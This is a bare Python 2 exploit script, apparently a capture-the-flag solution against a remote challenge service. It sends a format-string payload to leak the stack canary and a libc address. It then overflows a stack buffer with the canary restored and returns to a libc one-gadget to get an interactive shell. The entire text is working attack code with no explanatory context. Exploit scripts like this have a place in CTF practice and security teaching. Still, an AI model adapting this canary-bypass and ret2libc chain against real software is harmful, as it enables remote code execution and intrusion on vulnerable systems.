import socket
import struct
import telnetlib
from hexdump import *
def recv_until(s,string):
	r = ""
	while not r.endswith(string):
		tmp = s.recv(1)
		if not tmp: break
		r += tmp
s = socket.create_connection(['prob.layer7.kr',10003])
#s = socket.create_connection(['0',1234])
raw_input()
s.send('-1\n')
s.send('%43$lx%2$lx\n')
r  = s.recv(100)
print r
canary = long(r[:16],16)
libc = long(r[16:16+14],16)-0x3c5790
print hex(canary)
print hex(libc)
dat = "A"*(0x108)
dat += struct.pack('<Q',canary)
dat += "A"*8
dat += struct.pack('<Q',libc+0x45206)
s.send(dat+'\n')
#print hexdump(s.recv(100))
t = telnetlib.Telnet()
t.sock = s
t.interact()
